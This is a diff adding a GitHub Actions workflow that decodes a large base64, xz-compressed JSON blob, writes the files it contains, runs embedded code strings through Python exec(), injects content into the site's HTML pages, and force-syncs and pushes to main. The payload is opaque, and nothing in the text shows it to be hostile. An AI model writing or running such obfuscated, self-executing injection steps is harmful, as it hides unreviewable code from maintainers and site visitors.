@@ -1,0 +1,75 @@
+name: Installation Spotting
+
+on:
+  push:
+    paths:
+      - ".github/workflows/installer-spotting.yml"
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  installer:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Robot 36 - Site sans panne visible
+        run: |
+          cat > /tmp/paquet.b64 <<'B64EOF'
+          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
+          B64EOF
+          cat > /tmp/appli.py <<'PYEOF'
+          import base64, lzma, json, pathlib
+          d = json.loads(lzma.decompress(base64.b64decode(pathlib.Path("/tmp/paquet.b64").read_text().replace("\n", ""))))
+          P = pathlib.Path
+          for k, v in d["f"].items():
+              P(k).parent.mkdir(parents=True, exist_ok=True); P(k).write_text(v, encoding="utf-8")
+          h = P("index.html"); t = h.read_text(encoding="utf-8")
+          if d.get("inj"):
+              ns = {}; exec(d["inj"], ns); t = ns["injecter"](t)
+          for a, b in d.get("rep", []):
+              if b not in t: t = t.replace(a, b)
+          h.write_text(t, encoding="utf-8")
+          if d.get("ico"):
+              import os; exec(d["ico"], {})
+          if d.get("spot"):
+              s = P("spotting/index.html"); u = s.read_text(encoding="utf-8")
+              if d["spot"] not in u: u = u.replace("</body>", d["spot"] + "\n</body>", 1); s.write_text(u, encoding="utf-8")
+          print("OK")
+
+          PYEOF
+          git config user.name "robot-cotes-et-routes"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          for essai in 1 2 3 4 5 6; do
+            git fetch origin main && git reset --hard origin/main
+            python3 /tmp/appli.py
+            git add -A .
+            if git diff --cached --quiet; then echo "Deja a jour"; exit 0; fi
+            git commit -m "Site sans panne visible : derniere bonne version affichee si GitHub ou une donnee flanche"
+            if git push; then echo "Installe"; exit 0; fi
+            sleep 15
+          done
+          exit 1
+          
